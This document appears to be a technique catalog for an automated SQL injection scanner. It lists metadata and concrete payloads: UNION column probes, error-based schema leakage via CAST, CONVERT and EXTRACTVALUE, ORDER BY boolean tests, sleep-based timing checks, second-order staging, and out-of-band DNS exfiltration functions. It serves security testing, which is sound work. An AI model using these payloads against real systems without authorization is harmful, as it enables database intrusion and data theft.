# UCMA-X — Validated SQL Security Technique Catalog

**Catalog Standard:** Extensible Semantic Capability Repository  
**Production Invariant:** Only `CONFIRMED` techniques enter automatic live scan loops.  

---

## 1. Technique Classification Schema

Every technique in the UCMA-X catalog is defined with strict semantic metadata:

```yaml
TechniqueID: "TECH-P0-001"
Name: "Boolean-Blind Differential Tautology Test"
SemanticIntent: "TRUE_FALSE_DIFFERENTIAL"
Priority: "P0" # P0 (Modern Common), P1 (Arch-Dependent), P2 (Specialized), P3 (Historical)
Lifecycle: "CONFIRMED" # CONFIRMED | CANDIDATE | RESEARCH | DEPRECATED | UNSUPPORTED
Contexts: ["single_quote_string", "numeric", "double_quote_string", "parenthesized_string", "like_clause"]
CompatibleDBMS: ["PostgreSQL", "MySQL", "Microsoft SQL Server", "Oracle", "SQLite", "Generic SQL"]
Transports: ["query", "body_form", "body_json", "cookie", "header", "path", "graphql"]
SafetyClass: "PARALLEL_SAFE" # PARALLEL_SAFE | TIMING_SENSITIVE | STATE_DEPENDENT | ORDER_DEPENDENT | SESSION_SENSITIVE
PrimaryOracle: "BOOLEAN_CONTENT_DIFF"
SecondaryOracles: ["BOOLEAN_STATUS_CODE", "DOM_STRUCTURAL_DIFF"]
EstimatedCost: 2 # Requests required
ExpectedInfoGain: 0.90 # Shannon entropy reduction potential
ConfirmationMethod: "5-Step Counterfactual Causal Protocol (s0 -> s4)"
ResearchProvenance: "OWASP WSTG-INPV-05 / PortSwigger Web Security Academy"
```

---

## 2. Master Catalog Inventory (Key Verified Techniques)

### 2.1 Category M01: In-Band Set Operations (UNION Projection)

#### `TECH-P0-UNION-001`: Canary Reflection Column Count Alignment
- **Intent**: `UNION_COMPATIBILITY_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `PARALLEL_SAFE`
- **Context**: `single_quote_string`, `numeric`
- **DBMS**: All major DBMSs
- **Oracle**: `UNION_CANARY_REFLECTION` (99% confidence)
- **Mechanism**: Injects `' UNION SELECT NULL,'snt_canary_xyz',NULL--` iterating column counts 1 to 20.
- **Cost**: 1–2 requests per candidate width.

#### `TECH-P0-UNION-002`: Multi-Column Delimited Data Extraction
- **Intent**: `METADATA_DISCOVERY_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `PARALLEL_SAFE`
- **Context**: Aligned column position
- **Oracle**: `DIRECT_IN_BAND_REFLECTION`
- **Mechanism**: Concat expressions (`COALESCE(c::text,'')` / `CONCAT(c1,'~',c2)`) wrapped in unique boundary markers.

---

### 2.2 Category M02: Error-Based Type Conversion & Coercion

#### `TECH-P0-ERR-001`: PostgreSQL Integer CAST Schema Leakage
- **Intent**: `ERROR_BEHAVIOR_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `PARALLEL_SAFE`
- **Context**: `single_quote_string`, `numeric`, `where_clause`
- **DBMS**: `PostgreSQL`
- **Oracle**: `CAST_TYPE_ERROR` (95% confidence)
- **Mechanism**: `' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET N) AS int)--`
- **Cost**: 1 request per entity.

#### `TECH-P0-ERR-002`: MSSQL CONVERT Type Coercion
- **Intent**: `ERROR_BEHAVIOR_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `PARALLEL_SAFE`
- **Context**: `single_quote_string`, `numeric`
- **DBMS**: `Microsoft SQL Server`
- **Oracle**: `CAST_TYPE_ERROR` (95% confidence)
- **Mechanism**: `' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--`

#### `TECH-P0-ERR-003`: MySQL EXTRACTVALUE / UpdateXML XPath Error
- **Intent**: `ERROR_BEHAVIOR_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `PARALLEL_SAFE`
- **Context**: `single_quote_string`, `numeric`
- **DBMS**: `MySQL`, `MariaDB`
- **Oracle**: `VERBOSE_SYNTAX_ERROR` (90% confidence)
- **Mechanism**: `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))--`

---

### 2.3 Category M03: Sorting & Structural Identifier Manipulation

#### `TECH-P0-ORD-001`: Dynamic CASE-Based `ORDER BY` Boundary Test
- **Intent**: `ORDER_BOUNDARY_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `PARALLEL_SAFE`
- **Context**: `order_by_clause`, `identifier`
- **DBMS**: All major DBMSs
- **Oracle**: `BOOLEAN_CONTENT_DIFF` (90% confidence)
- **Mechanism**: `(CASE WHEN (1=1) THEN 1 ELSE 2 END)` vs `(CASE WHEN (1=2) THEN 1 ELSE 2 END)`
- **Cost**: 2 requests per test.

---

### 2.4 Category M04: Statistical Time-Delay (Wald SPRT)

#### `TECH-P0-TIME-001`: Sequential Probability Ratio Test (SPRT) Latency Shift
- **Intent**: `TIMING_BEHAVIOR_TEST`
- **Priority**: `P0` | **Lifecycle**: `CONFIRMED` | **Safety**: `TIMING_SENSITIVE` (Sequential Lane)
- **Context**: All contexts
- **DBMS**: `PostgreSQL` (`pg_sleep(3)`), `MySQL` (`SLEEP(3)`), `MSSQL` (`WAITFOR DELAY '0:0:3'`), `Oracle` (`DBMS_LOCK.SLEEP(3)`)
- **Oracle**: `SPRT_STATISTICAL_LATENCY` ($\alpha=0.01, \beta=0.01$)
- **Cost**: 2–4 sequential samples.

---

### 2.5 Category M05: Multi-Step & Second-Order Workflows

#### `TECH-P1-SO-001`: Two-Stage Registration-to-Profile Correlation
- **Intent**: `STATE_TRANSITION_TEST`
- **Priority**: `P1` | **Lifecycle**: `CONFIRMED` | **Safety**: `STATE_DEPENDENT`
- **Context**: `single_quote_string`, `body_json`
- **Oracle**: `STATE_CHANGE_SIDE_EFFECT`
- **Mechanism**: Stages payload in `POST /register`, triggers execution in `GET /profile`.

---

### 2.6 Category M06: Out-of-Band (OAST) Exfiltration

#### `TECH-P1-OOB-001`: DNS Resolution Token Exfiltration
- **Intent**: `OOB_INTERACTION_TEST`
- **Priority**: `P1` | **Lifecycle**: `CANDIDATE` (Requires External Listener Gateway) | **Safety**: `PARALLEL_SAFE`
- **Context**: All contexts
- **DBMS**: `Oracle` (`UTL_INADDR.GET_HOST_NAME`), `MSSQL` (`master..xp_dirtree`), `PostgreSQL` (`dblink`)
- **Oracle**: `OOB_DNS_INTERACTION`
